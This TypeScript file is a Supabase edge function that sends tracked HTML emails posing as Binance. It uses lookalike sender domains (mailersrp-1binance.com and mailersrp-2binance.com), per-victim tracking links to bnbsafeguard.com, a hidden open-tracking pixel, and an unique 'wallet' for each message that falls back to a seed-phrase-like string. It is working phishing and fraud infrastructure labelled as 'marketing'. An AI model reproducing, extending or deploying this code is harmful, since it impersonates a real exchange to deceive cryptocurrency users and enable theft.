
import { serve } from "https://deno.land/std@0.190.0/http/server.ts";
import { Resend } from "npm:resend@2.0.0";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2.50.2";

// Initialize Resend with default API key
let resend = new Resend(Deno.env.get("RESEND_API_KEY"));

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

interface EmailRequest {
  to: string;
  name: string;
  first_name: string;
  user_id: string;
  contact_id?: string;
  template_id?: string;
  subject?: string;
  content?: string;
  commercial_id?: string;
  domain?: string;
  wallet?: string;
  step?: number;
}

const handler = async (req: Request): Promise<Response> => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { to, name, first_name, user_id, contact_id, template_id, subject, content, commercial_id, domain, wallet, step }: EmailRequest = await req.json();
    
    console.log('Email request received:', { to, name, first_name, user_id, contact_id, template_id, commercial_id, domain, step });

    // Select API key and domain based on user choice
    let apiKey = Deno.env.get("RESEND_API_KEY"); // Default domain 1
    let fromDomain = "mailersrp-1binance.com";
    
    if (domain === "domain2") {
      apiKey = Deno.env.get("RESEND_API_KEY_DOMAIN2");
      fromDomain = "mailersrp-2binance.com";
    }
    
    // Initialize Resend with the selected API key
    resend = new Resend(apiKey);
    
    console.log('Using domain:', fromDomain);

    // Initialize Supabase client
    const supabase = createClient(
      Deno.env.get("SUPABASE_URL") ?? "",
      Deno.env.get("SUPABASE_ANON_KEY") ?? ""
    );

    // Fetch the current server IP from the database
    const { data: serverConfig, error: configError } = await supabase
      .from('server_config')
      .select('current_server_ip')
      .single();

    let currentServerIp = '127.0.0.1'; // fallback IP
    if (configError) {
      console.warn('Could not fetch server config, using fallback IP:', configError);
    } else if (serverConfig?.current_server_ip) {
      currentServerIp = String(serverConfig.current_server_ip);
    }

    console.log("Current server IP from database:", currentServerIp);

    // Generate tracking code - use contact_id if available, otherwise use user_id with timestamp
    const trackingCode = contact_id || `${user_id}_${Date.now()}`;
    // Add commercial tracking to the link if commercial_id is provided
    const commercialParam = commercial_id ? `&c=${commercial_id}` : '';
    const trackingLink = `https://api.bnbsafeguard.com/?=${trackingCode}${commercialParam}`;

    // Calculate current time minus 10 minutes in UTC
    const now = new Date();
    const timeMinus10 = new Date(now.getTime() - 10 * 60 * 1000);
    const formattedTime = timeMinus10.toISOString().replace('T', ' ').replace(/\.\d{3}Z$/, ' UTC');

    // Create tracking pixel URL for open tracking
    const openTrackingUrl = `https://lnokphjzmvdegutjpxhw.supabase.co/functions/v1/track-email-open?id=${trackingCode}`;

    // Process template content if provided
    let emailSubject = subject || "Your Secure WireGuard Access Link";
    let emailContent = content || `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; background-color: white; color: black;">
        <h2 style="color: #f59e0b;">Hello {{first_name}},</h2>
        
        <p>We hope this email finds you well.</p>
        
        <p>Your secure WireGuard access link is ready:</p>
        
        <div style="text-align: center; margin: 30px 0;">
          <a href="{{link}}" 
             style="background-color: #f59e0b; color: black; padding: 15px 30px; 
                    text-decoration: none; border-radius: 5px; font-weight: bold;">
            Access Your Secure Connection
          </a>
        </div>
        
        <p>This link is personalized for you and provides secure access to our WireGuard VPN service.</p>
        
        <p><strong>Current Server IP:</strong> {{current_ip}}</p>
        <p><strong>Generated at:</strong> {{current_time_minus_10}}</p>
        
        <p>Best regards,<br>
        The BINANCE Team</p>
        
        <hr style="margin: 30px 0; border: 1px solid #e5e7eb;">
        <p style="font-size: 12px; color: #6b7280;">
          This is an automated message. Please do not reply to this email.
        </p>
      </div>
    `;

    // Function to get a unique wallet for each occurrence
    const getUniqueWallet = async () => {
      try {
        // If a wallet is explicitly provided in the request payload, use it
        if (wallet && typeof wallet === 'string' && wallet.trim().length > 0) {
          return wallet.trim();
        }

        if (!commercial_id) {
          return 'bright ocean wave crystal mountain forest ancient wisdom flowing energy';
        }
        
        const { data: walletResponse, error: walletError } = await supabase.functions.invoke('get-wallet', {
          body: { 
            commercial_id: commercial_id,
            client_tracking_id: `${trackingCode}_${Date.now()}_${Math.random()}`
          }
        });
        
        if (walletError || !walletResponse?.success || !walletResponse?.wallet) {
          console.error('Error getting wallet:', walletError);
          return 'bright ocean wave crystal mountain forest ancient wisdom flowing energy';
        }
        
        return walletResponse.wallet;
      } catch (error) {
        console.error('Error calling get-wallet function:', error);
        return 'bright ocean wave crystal mountain forest ancient wisdom flowing energy';
      }
    };

    // Replace template variables for both custom content and default template
    // Use commercial_id and contact_id for the home link to track both commercial and lead
    const homeLink = commercial_id && contact_id ? `https://api.bnbsafeguard.com/?c=${commercial_id}&l=${contact_id}` : 
                    commercial_id ? `https://api.bnbsafeguard.com/?c=${commercial_id}` : trackingLink;
    
    // Replace non-wallet variables first
    emailContent = emailContent
      .replace(/{{name}}/g, name)
      .replace(/{{first_name}}/g, first_name)
      .replace(/{{email}}/g, to)
      .replace(/{{phone}}/g, '') // Phone not available in email context
      .replace(/{{current_ip}}/g, currentServerIp)
      .replace(/{{link}}/g, trackingLink)
      .replace(/{{home_link}}/g, homeLink)
      .replace(/{{current_time_minus_10}}/g, formattedTime);

    // Replace wallet placeholder (case/space tolerant incl. NBSP) with unique wallets for each occurrence
    const walletMatches = emailContent.match(/{{[\s\u00A0\uFEFF]*wallet[\s\u00A0\uFEFF]*}}/gi);
    if (walletMatches) {
      for (let i = 0; i < walletMatches.length; i++) {
        const uniqueWallet = await getUniqueWallet();
        emailContent = emailContent.replace(/{{[\s\u00A0\uFEFF]*wallet[\s\u00A0\uFEFF]*}}/i, uniqueWallet);
      }
    }

    if (subject) {
      emailSubject = subject
        .replace(/{{name}}/g, name)
        .replace(/{{first_name}}/g, first_name)
        .replace(/{{email}}/g, to)
        .replace(/{{current_ip}}/g, currentServerIp)
        .replace(/{{link}}/g, trackingLink)
        .replace(/{{home_link}}/g, homeLink)
        .replace(/{{current_time_minus_10}}/g, formattedTime);
      
      // Replace wallet placeholder (case/space tolerant incl. NBSP) with unique wallets for each occurrence in subject
      const subjectWalletMatches = emailSubject.match(/{{[\s\u00A0\uFEFF]*wallet[\s\u00A0\uFEFF]*}}/gi);
      if (subjectWalletMatches) {
        for (let i = 0; i < subjectWalletMatches.length; i++) {
          const uniqueWallet = await getUniqueWallet();
          emailSubject = emailSubject.replace(/{{[\s\u00A0\uFEFF]*wallet[\s\u00A0\uFEFF]*}}/i, uniqueWallet);
        }
      }
    }

    // Add tracking pixel to email content
    emailContent += `<img src="${openTrackingUrl}" width="1" height="1" style="display:none;" />`;

    // Log email sending attempt
    console.log("Sending email to:", to, "with tracking code:", trackingCode);
    console.log("Server IP used:", currentServerIp);

    const emailResponse = await resend.emails.send({
      from: fromDomain === "mailersrp-2binance.com" 
        ? "BINANCE <noreply@mailersrp-2binance.com>"
        : "BINANCE <donotreply@mailersrp-1binance.com>",
      to: [to],
      subject: emailSubject,
      html: emailContent,
      tags: [
        {
          name: 'campaign',
          value: 'wireguard-marketing'
        },
        {
          name: 'tracking_code',
          value: trackingCode
        },
        {
          name: 'step',
          value: step ? `step-${step}` : 'step-1'
        }
      ]
    });


    console.log("Marketing email sent successfully:", emailResponse);

    // Log to database in background (non-blocking)
    EdgeRuntime.waitUntil(
      supabase.from('email_logs').insert({
        tracking_code: trackingCode,
        recipient_email: to,
        recipient_name: name,
        contact_id: contact_id,
        user_id: user_id,
        template_id: template_id,
        subject: emailSubject,
        status: 'sent',
        sent_at: new Date().toISOString(),
        resend_id: emailResponse.data?.id,
        commercial_id: commercial_id
      })
    );

    return new Response(JSON.stringify({
      success: true,
      message: "Email sent successfully",
      tracking_code: trackingCode,
      email_id: emailResponse.data?.id,
      recipient: to,
      server_ip_used: currentServerIp
    }), {
      status: 200,
      headers: {
        "Content-Type": "application/json",
        ...corsHeaders,
      },
    });
  } catch (error: any) {
    console.error("Error in send-marketing-email function:", error);
    return new Response(
      JSON.stringify({ error: error.message }),
      {
        status: 500,
        headers: { "Content-Type": "application/json", ...corsHeaders },
      }
    );
  }
};

serve(handler);
